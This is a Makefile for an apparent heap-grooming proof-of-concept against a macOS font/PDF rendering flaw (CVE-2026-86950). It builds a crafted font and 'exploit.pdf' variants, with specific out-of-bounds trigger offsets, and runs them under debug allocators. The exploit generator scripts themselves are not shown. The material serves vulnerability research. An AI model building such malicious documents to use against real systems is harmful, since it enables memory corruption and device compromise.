# CVE-2026-86950 Heap Feng Shui PoC
# Educational research only — for testing on devices you own

CFLAGS = -framework CoreGraphics -framework ImageIO -framework CoreFoundation
CFLAGS += -Wall -g -O0

.PHONY: all clean font pdf neg-tx oob-confirm run run-guard

all: font pdf render_debug

# Original variant: DX=17, TX=16409 (OOB +60 bytes into next alloc)
font: gen_feng_shui_font.py
	python3 gen_feng_shui_font.py feng_shui_trigger.ttf

pdf: font gen_exploit_pdf.py
	python3 gen_exploit_pdf.py exploit.pdf feng_shui_trigger.ttf

# Negative-TX variant: DX=2, TX=-16367 (OOB byte-0 aligned to next alloc)
neg-tx: gen_neg_tx_font.py gen_exploit_pdf.py
	python3 gen_neg_tx_font.py neg_tx_trigger.ttf
	python3 gen_exploit_pdf.py neg_tx_exploit.pdf neg_tx_trigger.ttf

# Step 2a: Visual OOB confirmation via CMYK image pixel corruption
oob-confirm: gen_neg_tx_font.py gen_oob_confirm_pdf.py
	python3 gen_neg_tx_font.py neg_tx_trigger.ttf
	python3 gen_oob_confirm_pdf.py oob_confirm.pdf neg_tx_trigger.ttf

render_debug: render_debug.c
	clang $(CFLAGS) -o render_debug render_debug.c

run: all
	MallocGuardEdges=1 MallocScribble=1 ./render_debug exploit.pdf

run-guard: all
	DYLD_INSERT_LIBRARIES=/usr/lib/libgmalloc.dylib ./render_debug exploit.pdf

clean:
	rm -f render_debug exploit.pdf feng_shui_trigger.ttf neg_tx_trigger.ttf neg_tx_exploit.pdf *.o
